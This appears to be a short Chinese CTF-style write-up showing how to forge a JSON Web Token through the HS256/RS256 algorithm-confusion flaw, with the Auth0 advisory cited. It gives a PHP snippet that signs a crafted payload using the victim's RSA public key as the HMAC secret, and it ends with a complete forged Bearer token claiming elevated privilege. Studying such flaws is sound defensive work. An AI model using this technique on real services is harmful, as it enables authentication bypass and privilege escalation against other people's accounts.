#### 漏洞在这里 

https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/

伪造一个数据：

```
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "name": "wonderkun",
  "priv": "purple"
}

```
两部分进行base64编码之后,合起来：
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoid29uZGVya3VuIiwicHJpdiI6InB1cnBsZSJ9
```

然后获取到 wonderkun用户的pubkey为：

```
{
  "pubkey": "-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDuhvBzuGjX0ebOQzvQanMJjCzx\nK/LilBCSzVTT8tM0Nh1wb2VsoYzgBYRV3vgpCL6+XmRt94TsHoWS3h7RGsgWfK0z\nM0ftQvlB+42kvhpq3FNr0wPDCoOhfRrnoRl9llZV9SJQ6KaNjd6uZoqqDfoxwguj\nBayO2MeTdxEjnWai0wIDAQAB\n-----END PUBLIC KEY-----", 
  "result": true
}
```

用pubkey作为 HMAC_sha256的secret,算一下签名：

```php
$s = hash_hmac('sha256', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoid29uZGVya3VuIiwicHJpdiI6InB1cnBsZSJ9', "-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDuhvBzuGjX0ebOQzvQanMJjCzx
K/LilBCSzVTT8tM0Nh1wb2VsoYzgBYRV3vgpCL6+XmRt94TsHoWS3h7RGsgWfK0z
M0ftQvlB+42kvhpq3FNr0wPDCoOhfRrnoRl9llZV9SJQ6KaNjd6uZoqqDfoxwguj
BayO2MeTdxEjnWai0wIDAQAB
-----END PUBLIC KEY-----", true);
echo base64_encode($s);

// +LFGcQOT63LZuPCSHyCGA3wOqft4NTg9V6NGm1aiB68= 
```

然后合起来

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoid29uZGVya3VuIiwicHJpdiI6InB1cnBsZSJ9.+LFGcQOT63LZuPCSHyCGA3wOqft4NTg9V6NGm1aiB68=
```
根据规则：
  1. 删除等号
  2. 把 + 变为 -
  3. 把 / 变为 _ 

得到的token为

```
Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoid29uZGVya3VuIiwicHJpdiI6InB1cnBsZSJ9.-LFGcQOT63LZuPCSHyCGA3wOqft4NTg9V6NGm1aiB68
``` 

